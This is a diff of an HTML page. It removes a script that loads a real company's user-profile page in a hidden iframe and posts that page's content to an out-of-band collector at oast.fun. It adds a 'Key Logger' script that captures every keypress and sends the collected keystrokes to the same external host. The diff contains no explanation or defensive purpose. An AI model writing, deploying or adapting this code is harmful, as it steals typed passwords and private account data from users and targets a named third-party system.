@@ -3,51 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iframe Content Forwarder</title>
+    <title>Key Logger</title>
     <script>
-        // Function to fetch content from the iframe and send it to target.com
-        function forwardIframeContent() {
-            var targetUrl = 'https://jjezhcyzocwcsjemnfvilb6pp4vfhwmgo.oast.fun/receive'; // URL of target.com's endpoint
+        var keystrokes = []; // Array to store keystrokes
 
-            // Get the iframe element
-            var iframe = document.getElementById('evilFrame');
+        // Function to send accumulated keystrokes to the server
+        function sendKeystrokes() {
+            if (keystrokes.length > 0) {
+                // Send the keystrokes to your server
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://jjezhcyzocwcsjemnfvilb6pp4vfhwmgo.oast.fun/recieved_keystrokes', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({ keystrokes: keystrokes }));
 
-            // Check if the iframe element exists
-            if (iframe) {
-                // Get the content of the iframe
-                var iframeContent = iframe.contentWindow.document.body.innerHTML;
-
-                // Send the content to target.com
-                fetch(targetUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'text/html'
-                    },
-                    body: iframeContent
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send iframe content to target.com');
-                    }
-                    console.log('Iframe content sent successfully to target.com');
-                })
-                .catch(error => {
-                    console.error(error);
-                });
-            } else {
-                console.error('Iframe element not found');
+                // Clear the array after sending
+                keystrokes = [];
             }
         }
 
-        // Call the function when the page loads
-        window.onload = function() {
-            forwardIframeContent();
-        };
+        // Function to add a key to the array
+        function addKeyToQueue(key) {
+            keystrokes.push(key);
+        }
+
+        // Function to be called when enter key is pressed
+        function checkEnterKey(event) {
+            if (event.key === 'Enter') {
+                sendKeystrokes(); // Send accumulated keystrokes
+            }
+        }
+
+        document.addEventListener('keypress', function(event) {
+            var key = event.key;
+            addKeyToQueue(key);
+            checkEnterKey(event); // Check if Enter key is pressed
+        });
     </script>
 </head>
 <body>
     <!-- Your HTML content here -->
-    <!-- The iframe that loads evil.com -->
-    <iframe id="evilFrame" src="https://ipmsuat.lntecc.com/WrenchWeb_Test/Utilities/DisplayUpdateUsersProfile" style="display: none;"></iframe>
 </body>
 </html>
